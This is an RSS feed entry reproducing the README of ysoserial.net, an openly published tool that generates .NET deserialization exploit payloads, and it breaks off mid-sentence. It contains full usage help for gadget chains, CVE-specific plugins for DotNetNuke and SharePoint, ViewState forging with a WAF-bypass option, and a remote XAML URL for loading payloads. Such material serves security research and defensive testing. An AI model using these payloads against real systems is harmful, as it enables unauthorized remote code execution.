<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-04T01:47:26Z</updated>
  <subtitle>Weekly Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>pwntester/ysoserial.net</title>
    <updated>2024-02-04T01:47:26Z</updated>
    <id>tag:github.com,2024-02-04:/pwntester/ysoserial.net</id>
    <link href="https://github.com/pwntester/ysoserial.net" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Deserialization payload generator for a variety of .NET formatters&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;&lt;img src=&#34;https://raw.githubusercontent.com/pwntester/ysoserial.net/master/logo.png&#34; alt=&#34;logo&#34;&gt;&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/pwntester/ysoserial.net/workflows/Build/badge.svg?branch=master&#34; alt=&#34;GitHub CI&#34;&gt; &lt;a href=&#34;https://dev.azure.com/alvaro0002/ysoserial.net/_build/latest?definitionId=1&amp;amp;branchName=v2&#34;&gt;&lt;img src=&#34;https://img.shields.io/azure-devops/build/alvaro0002/ysoserial.net/1/v2.svg?label=v2%20branch&#34; alt=&#34;v2&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/releases/latest&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/download-latest-blue.svg?sanitize=true&#34; alt=&#34;download&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/pwntester/ysoserial.net/master/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/pwntester/ysoserial.net.svg?sanitize=true&#34; alt=&#34;license&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/stars/pwntester/ysoserial.net.svg?style=social&#34; alt=&#34;stars&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/forks/pwntester/ysoserial.net.svg?style=social&#34; alt=&#34;forks&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.&lt;/p&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;ysoserial.net is a collection of utilities and property-oriented programming &#34;gadget chains&#34; discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.&lt;/p&gt; &#xA;&lt;p&gt;It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.&lt;/p&gt; &#xA;&lt;p&gt;This project is inspired by &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;Chris Frohoff&#39;s ysoserial project&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.&lt;/p&gt; &#xA;&lt;p&gt;This software is a personal project and not related with any companies, including Project owner and contributors employers.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;In order to obtain the latest version, it is recommended to download it from &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/actions&#34;&gt;the Actions page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can install the previous releases of YSoSerial.NET from &lt;a href=&#34;https://github.com/pwntester/ysoserial.net/releases&#34;&gt;the releases page&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe --fullhelp&#xA;ysoserial.net generates deserialization payloads for a variety of .NET formatters.&#xA;&#xA;== GADGETS ==&#xA;        (*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Not bridge but derived&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Choices: 1 -&amp;gt; use TypeConfuseDelegateGenerator&#xA;                                                       [default], 2 -&amp;gt; use&#xA;                                                       TextFormattingRunPropertiesMarshal&#xA;&#xA;        (*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class]&#xA;                Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter&#xA;                        Labels: Not bridge or derived&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Payload variant number where applicable.&#xA;                                                       Choices: 1 (default), 2 (shorter but may not&#xA;                                                       work between versions)&#xA;&#xA;        (*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;]&#xA;                Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter&#xA;                        Labels: Not bridge or derived&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Payload variant number where applicable.&#xA;                                                       Choices: 1 (default), 2 (shorter but may not&#xA;                                                       work between versions)&#xA;&#xA;        (*) AxHostState&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) BaseActivationFactory [Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)]&#xA;                Formatters: Json.Net&#xA;                        Labels: Not bridge or derived, .NET 5/6/7, Requires WPF enabled or PresentationFramework.dll&#xA;        (*) ClaimsIdentity&#xA;                Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;                        Labels: Bridge and derived, OnDeserialized&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) ClaimsPrincipal&#xA;                Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;                        Labels: Bridge and derived, OnDeserialized, SecondOrderDeserialization&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) DataSet&#xA;                Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) DataSetOldBehaviour [This gadget targets and old behaviour of DataSet which uses XML format]&#xA;                Formatters: BinaryFormatter , LosFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: LosFormatter&#xA;                        Extra options:&#xA;                              --spoofedAssembly=VALUE&#xA;                                                     The assembly name you want to use in the&#xA;                                                       generated serialized object (example: &#39;mscorlib&#39;)&#xA;&#xA;        (*) DataSetOldBehaviourFromFile [Another variant of the DataSetOldBehaviour gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;]&#xA;                Formatters: BinaryFormatter , LosFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Extra options:&#xA;                              --spoofedAssembly=VALUE&#xA;                                                     The assembly name you want to use in the&#xA;                                                       generated serialized object (example: &#39;mscorlib&#39;)&#xA;&#xA;        (*) DataSetTypeSpoof [A more advanced type spoofing which can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget]&#xA;                Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) GenericPrincipal&#xA;                Formatters: BinaryFormatter , LosFormatter&#xA;                        Labels: Bridge and derived, OnDeserialized, SecondOrderDeserialization&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Payload variant number where applicable.&#xA;                                                       Choices: 1 (uses serialized ClaimsIdentities), 2&#xA;                                                       (uses serialized Claims)&#xA;&#xA;        (*) GetterCompilerResults [Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework. DLL path delivered with -c argument]&#xA;                Formatters: Json.Net&#xA;                        Labels: Chain of arbitrary getter call and not derived gadget, Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Variant number. Variant defines a different&#xA;                                                       getter-call gadget. Choices:&#xA;                                                       1 (default) - PropertyGrid getter-call gadget,&#xA;                                                       2 - ComboBox getter-call gadget&#xA;                                                       3 - ListBox getter-call gadget&#xA;                                                       4 - CheckedListBox getter-call gadget&#xA;&#xA;        (*) GetterSecurityException&#xA;                Formatters: Json.Net&#xA;                        Labels: Chain of arbitrary getter call and derived gadget&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Variant number. Variant defines a different&#xA;                                                       getter-call gadget. Choices:&#xA;                                                       1 (default) - PropertyGrid getter-call gadget,&#xA;                                                       2 - ComboBox getter-call gadget&#xA;                                                       3 - ListBox getter-call gadget&#xA;                                                       4 - CheckedListBox getter-call gadget&#xA;&#xA;        (*) GetterSettingsPropertyValue&#xA;                Formatters: Json.Net , MessagePackTypeless &amp;gt;= 2.3.75 , MessagePackTypelessLz4 &amp;gt;= 2.3.75 , Xaml&#xA;                        Labels: Chain of arbitrary getter call and derived gadget&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Variant number. Variant defines a different&#xA;                                                       getter-call gadget. Choices:&#xA;                                                       1 (default) - PropertyGrid getter-call gadget,&#xA;                                                       2 - ComboBox getter-call gadget&#xA;                                                       3 - ListBox getter-call gadget&#xA;                                                       4 - CheckedListBox getter-call gadget&#xA;&#xA;        (*) ObjectDataProvider&#xA;                Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , MessagePackTypeless &amp;gt;= 2.3.75 , MessagePackTypelessLz4 &amp;gt;= 2.3.75 , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet &amp;lt; 5.0.0&#xA;                        Labels: Not bridge or derived&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Payload variant number where applicable.&#xA;                                                       Choices: 1, 2, 3, ... based on formatter.&#xA;                              --xamlurl=VALUE        This is to create a very short payload when&#xA;                                                       affected box can read the target XAML URL e.g.&#xA;                                                       &#34;http://b8.ee/x&#34; (can be a file path on a shared&#xA;                                                       drive or the local system). This is used by the&#xA;                                                       3rd XAML payload which is a ResourceDictionary&#xA;                                                       with the Source parameter. Command parameter&#xA;                                                       will be ignored. The shorter the better!&#xA;&#xA;        (*) ObjRef&#xA;                Formatters: BinaryFormatter , LosFormatter , ObjectStateFormatter , SoapFormatter&#xA;                        Labels:&#xA;        (*) PSObject [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)]&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Not bridge but derived&#xA;        (*) ResourceSet&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer&#xA;                        Labels: It relies on other gadgets and is not a real gadget on its own (not bridged or derived either)&#xA;                        Extra options:&#xA;                              --ig, --internalgadget=VALUE&#xA;                                                     The numerical internal gadget choice to use:&#xA;                                                       1=TypeConfuseDelegate,&#xA;                                                       2=TextFormattingRunProperties (default: 1&#xA;                                                       [TypeConfuseDelegate])&#xA;&#xA;        (*) RolePrincipal&#xA;                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) SessionSecurityToken&#xA;                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) SessionViewStateHistoryItem&#xA;                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: LosFormatter&#xA;        (*) TextFormattingRunProperties [This normally generates the shortest payload]&#xA;                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Not bridge but derived&#xA;                        Extra options:&#xA;                              --xamlurl=VALUE        This is to create a very short payload when&#xA;                                                       affected box can read the target XAML URL e.g.&#xA;                                                       &#34;http://b8.ee/x&#34; (can be a file path on a shared&#xA;                                                       drive or the local system). This is used by the&#xA;                                                       3rd XAML payload of ObjectDataProvider which is&#xA;                                                       a ResourceDictionary with the Source parameter.&#xA;                                                       Command parameter will be ignored. The shorter&#xA;                                                       the better!&#xA;                              --hasRootDCS           To include a root element with the&#xA;                                                       DataContractSerializer payload.&#xA;&#xA;        (*) ToolboxItemContainer&#xA;                Formatters: BinaryFormatter , LosFormatter , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) TypeConfuseDelegate&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer&#xA;                        Labels: Not bridge or derived&#xA;        (*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono]&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer&#xA;                        Labels: Not bridge or derived&#xA;        (*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)]&#xA;                Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)&#xA;                        Labels: Bridge and derived, Not in GAC&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Payload variant number where applicable.&#xA;                                                       Choices: 1, 2, or 3 based on formatter.&#xA;&#xA;        (*) WindowsIdentity&#xA;                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;                        Supported formatter for the bridge: BinaryFormatter&#xA;        (*) WindowsPrincipal&#xA;                Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Bridge and derived&#xA;        (*) XamlAssemblyLoadFromFile [Loads assembly using XAML. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;]&#xA;                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter&#xA;                        Labels: Not bridge but derived&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Choices: 1 -&amp;gt; use TypeConfuseDelegateGenerator&#xA;                                                       [default], 2 -&amp;gt; use&#xA;                                                       TextFormattingRunPropertiesMarshal&#xA;&#xA;        (*) XamlImageInfo [Gadget leads to XAML deserialization. Variant 1 (GAC) reads XAML from file (local path or UNC path can be given). Variant 2 (non-GAC) delivers XAML directly, but requires Microsoft.Web.Deployment.dll]&#xA;                Formatters: Json.Net&#xA;                        Labels: Not bridge but derived, Variant 1 in GAC, Variant 2 not in GAC&#xA;                        Extra options:&#xA;                              --var, --variant=VALUE Variant number. Variant defines a different&#xA;                                                       Stream delivery class. Choices:&#xA;                                                       1 (default and GAC) - LazyFileStream for Stream&#xA;                                                       delivery, file path has to be provided for -c&#xA;                                                       argument (UNC or local)&#xA;                                                       2 (non-GAC, requires Microsoft.Web.Deploymen-&#xA;                                                       t.dll) - ReadOnlyStreamFromStrings for Stream&#xA;                                                       delivery, command to execute can be provided for&#xA;                                                       -c argument&#xA;&#xA;&#xA;== PLUGINS ==&#xA;        (*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)&#xA;                Options:&#xA;                  -c, --command=VALUE        the command to be executed.&#xA;                  -u, --url=VALUE            the url passed to Activator.GetObject.&#xA;                  -s                         if TCPChannel security should be enabled.&#xA;&#xA;        (*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)&#xA;                Options:&#xA;                  -M, --mode=VALUE           the payload mode: HttpStaticObjectsCollection or&#xA;                                               SessionStateItemCollection. Default:&#xA;                                               HttpStaticObjectsCollection&#xA;                  -o, --output=VALUE         the output format (raw|base64).&#xA;                  -c, --command=VALUE        the command to be executed&#xA;                  -t, --test                 whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)&#xA;                Options:&#xA;                  -c, --command=VALUE        the command to be executed&#xA;                  -t, --test                 whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)&#xA;                Options:&#xA;                  -F, --format=VALUE         the object format: Csv, DeviceIndependentBitmap,&#xA;                                               DataInterchangeFormat, PenData, RiffAudio,&#xA;                                               WindowsForms10PersistentObject, System.String,&#xA;                                               SymbolicLink, TaggedImageFileFormat, WaveAudio.&#xA;                                               Default: WindowsForms10PersistentObject (the&#xA;                                               only one that works in Feb 2020 as a result of&#xA;                                               an incomplete silent patch - - will not be&#xA;                                               useful to target text based fields anymore)&#xA;                  -c, --command=VALUE        the command to be executed&#xA;                  -t, --test                 whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)&#xA;                Options:&#xA;                  -m, --mode=VALUE           the payload mode: read_file, write_file,&#xA;                                               run_command.&#xA;                  -c, --command=VALUE        the command to be executed in run_command mode.&#xA;                  -u, --url=VALUE            the url to fetch the file from in write_file&#xA;                                               mode.&#xA;                  -f, --file=VALUE           the file to read in read_file mode or the file&#xA;                                               to write to in write_file_mode.&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;&#xA;        (*) GetterCallGadgets (Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled)&#xA;                Options:&#xA;                  -l                         prints list of implemented gadgets&#xA;                  -i, --inner=VALUE          file containing inner-gadget&#xA;                  -g, --gadget=VALUE         gadget to use&#xA;                  -m, --member=VALUE         getter to call (required for some gadgets)&#xA;                  -t                         test gadget (execute)&#xA;&#xA;        (*) NetNonRceGadgets (Implements Non-RCE gadgets for .NET Framework)&#xA;                Options:&#xA;                  -l                         prints list of implemented gadgets&#xA;                  -i, --input=VALUE          input to the gadget&#xA;                  -g, --gadget=VALUE         gadget to use&#xA;                  -f, --formatter=VALUE      Formatter to use&#xA;                  -t                         test gadget (execute after generation)&#xA;&#xA;        (*) Resx (Generates RESX and .RESOURCES files)&#xA;                Options:&#xA;                  -M, --mode=VALUE           the payload mode: indirect_resx_file,&#xA;                                               CompiledDotResources (useful for CVE-2020-0932&#xA;                                               for example), BinaryFormatter, SoapFormatter.&#xA;                  -c, --command=VALUE        the command to be executed in BinaryFormatter&#xA;                                               and CompiledDotResources. If this is provided&#xA;                                               for SoapFormatter, it will be used as a file for&#xA;                                               ActivitySurrogateSelectorFromFile&#xA;                  -g, --gadget=VALUE         The gadget chain used for BinaryFormatter and&#xA;                                               CompiledDotResources (default:&#xA;                                               TextFormattingRunProperties).&#xA;                  -F, --file=VALUE           UNC file path location: this is used in&#xA;                                               indirect_resx_file mode.&#xA;                      --of, --outputfile=VALUE&#xA;                                             a file path location for CompiledDotResources to&#xA;                                               store the .resources file (default: payloa-&#xA;                                               d.resources)&#xA;                  -t, --test                 Whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)&#xA;                Options:&#xA;                  -c, --command=VALUE        the command to be executed e.g. &#34;cmd /c calc&#34;&#xA;                  -t, --test                 whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) SharePoint (Generates payloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421)&#xA;                Options:&#xA;                      --cve=VALUE            the CVE reference: CVE-2020-1147 (result is safe&#xA;                                               for a POST request), CVE-2019-0604, CVE-2018-8421&#xA;                      --useurl               to use the XAML url rather than using the direct&#xA;                                               command in CVE-2019-0604 and CVE-2018-8421&#xA;                  -g, --gadget=VALUE         a gadget chain that supports LosFormatter for&#xA;                                               CVE-2020-1147. Default: TypeConfuseDelegate&#xA;                  -c, --command=VALUE        the command to be executed e.g. &#34;cmd /c calc&#34; or&#xA;                                               the XAML url e.g. &#34;http://b8.ee/x&#34; to make the&#xA;                                               payload shorter with the `--useurl` argument&#xA;&#xA;        (*) ThirdPartyGadgets (Implements gadgets for 3rd Party Libraries)&#xA;                Options:&#xA;                  -l                         prints list of implemented gadgets&#xA;                  -i, --input=VALUE          input to the gadget&#xA;                  -g, --gadget=VALUE         gadget to use&#xA;                  -f, --formatter=VALUE      formatter to use&#xA;                  -r                         removes version and pubkeytoken from types, it&#xA;                                               may be useful when we do not know version of&#xA;                                               targetd library or require short payload&#xA;                  -t                         test gadget (execute after generation)&#xA;&#xA;        (*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)&#xA;                Options:&#xA;                  -c, --command=VALUE        the command to be executed&#xA;                  -t, --test                 whether to run payload locally. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;&#xA;        (*) ViewState (Generates a ViewState using known MachineKey parameters)&#xA;                Options:&#xA;                      --examples             to show a few examples. Other parameters will be&#xA;                                               ignored&#xA;                  -g, --gadget=VALUE         a gadget chain that supports LosFormatter.&#xA;                                               Default: ActivitySurrogateSelector&#xA;                  -c, --command=VALUE        the command suitable for the used gadget (will&#xA;                                               be ignored for ActivitySurrogateSelector)&#xA;                  -s, --stdin                The command to be executed will be read from&#xA;                                               standard input.&#xA;                      --upayload=VALUE       the unsigned LosFormatter payload in (base64&#xA;                                               encoded). The gadget and command parameters will&#xA;                                               be ignored&#xA;                      --generator=VALUE      the __VIEWSTATEGENERATOR value which is in HEX,&#xA;                                               useful for .NET &amp;lt;= 4.0. When not empty, &#39;legacy&#39;&#xA;                                               will be used and &#39;path&#39; and &#39;apppath&#39; will be&#xA;                                               ignored.&#xA;                      --path=VALUE           the target web page. example: /app/folder1/pag-&#xA;                                               e.aspx&#xA;                      --apppath=VALUE        the application path. this is needed in order to&#xA;                                               simulate TemplateSourceDirectory&#xA;                      --islegacy             when provided, it uses the legacy algorithm&#xA;                                               suitable for .NET 4.0 and below&#xA;                      --isencrypted          this will be used when the legacy algorithm is&#xA;                                               used to bypass WAFs&#xA;                      --viewstateuserkey=VALUE&#xA;                                             this to set the ViewStateUserKey parameter that&#xA;                                               sometimes used as the anti-CSRF token&#xA;                      --decryptionalg=VALUE  the encryption algorithm can be set to  DES,&#xA;                                               3DES, AES. Default: AES&#xA;                      --decryptionkey=VALUE  this is the decryptionKey attribute from&#xA;                                               machineKey in the web.config file&#xA;                      --validationalg=VALUE  the validation algorithm can be set to SHA1,&#xA;                                               HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES,&#xA;                                               AES. Default: HMACSHA256&#xA;                      --validationkey=VALUE  this is the validationKey attribute from&#xA;                                               machineKey in the web.config file&#xA;                      --showraw              to stop URL-encoding the result. Default: false&#xA;                      --minify               Whether to minify the payloads where applicable&#xA;                                               (experimental). Default: false&#xA;                      --ust, --usesimpletype This is to remove additional info only when&#xA;                                               minifying and FormatterAssemblyStyle=Simple.&#xA;                                               Default: true&#xA;                      --isdebug              to show useful debugging messages!&#xA;&#xA;&#xA;Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.&#xA;&#xA;Usage: ysoserial.exe [options]&#xA;Options:&#xA;  -p, --plugin=VALUE         The plugin to be used.&#xA;  -o, --output=VALUE         The output format (raw|base64|raw-&#xA;                               urlencode|base64-urlencode|hex). Default: raw&#xA;  -g, --gadget=VALUE         The gadget chain.&#xA;  -f, --formatter=VALUE      The formatter.&#xA;  -c, --command=VALUE        The command to be executed.&#xA;      --rawcmd               Command will be executed as is without `cmd /c `&#xA;                               being appended (anything after first space is an&#xA;                               argument).&#xA;  -s, --stdin                The command to be executed will be read from&#xA;                               standard input.&#xA;      --bgc, --bridgedgadgetchains=VALUE&#xA;                             Chain of bridged gadgets separated by comma (,).&#xA;                               Each gadget will be used to complete the next&#xA;                               bridge gadget. The last one will be used in the&#xA;                               requested gadget. This will be ignored when&#xA;                               using the searchformatter argument.&#xA;  -t, --test                 Whether to run payload locally. Default: false&#xA;      --outputpath=VALUE     The output file path. It will be ignored if&#xA;                               empty.&#xA;      --minify               Whether to minify the payloads where applicable.&#xA;                               Default: false&#xA;      --ust, --usesimpletype This is to remove additional info only when&#xA;                               minifying and FormatterAssemblyStyle=Simple&#xA;                               (always `true` with `--minify` for binary&#xA;                               formatters). Default: true&#xA;      --raf, --runallformatters&#xA;                             Whether to run all the gadgets with the provided&#xA;                               formatter (ignores gadget name, output format,&#xA;                               and the test flag arguments). This will search&#xA;                               in formatters and also show the displayed&#xA;                               payload length. Default: false&#xA;      --sf, --searchformatter=VALUE&#xA;                             Search in all formatters to show relevant&#xA;                               gadgets and their formatters (other parameters&#xA;                               will be ignored).&#xA;      --debugmode            Enable debugging to show exception errors and&#xA;                               output length&#xA;  -h, --help                 Shows this message and exit.&#xA;      --fullhelp             Shows this message + extra options for gadgets&#xA;                               and plugins and exit.&#xA;      --credit               Shows the credit/history of gadgets and plugins&#xA;                               (other parameters will be ignored).&#xA;      --runmytest            Runs that `Start` method of `TestingArenaHome` -&#xA;                               useful for testing and debugging.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; When specifying complex commands, it can be tedious to escape some special character (;, |, &amp;amp;, ..). Use stdin option (-s) to read the command from stdin:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the &#34;type&#34; attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.&lt;/p&gt; &#xA;&lt;h2&gt;Plugins&lt;/h2&gt; &#xA;&lt;p&gt;Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use &lt;code&gt;-p &amp;lt;plugin name&amp;gt;&lt;/code&gt; followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more help on plugin options use &lt;code&gt;-h&lt;/code&gt; along with &lt;code&gt;-p &amp;lt;plugin name&amp;gt;&lt;/code&gt;. Eg:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -h -p DotNetNuke&#xA;&#xA;ysoserial.net generates deserialization payloads for a variety of .NET formatters.&#xA;&#xA;Plugin:&#xA;&#xA;DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)&#xA;&#xA;Options:&#xA;&#xA;  -m, --mode=VALUE           the payload mode: read_file, write_file, run_command.&#xA;  -c, --command=VALUE        the command to be executed in run_command mode.&#xA;  -u, --url=VALUE            the url to fetch the file from in write_file mode.&#xA;  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.&#xA;      --minify               Whether to minify the payloads where applicable (experimental). Default: false&#xA;      --ust, --usesimpletype This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Generate a &lt;strong&gt;calc.exe&lt;/strong&gt; payload for Json.Net using 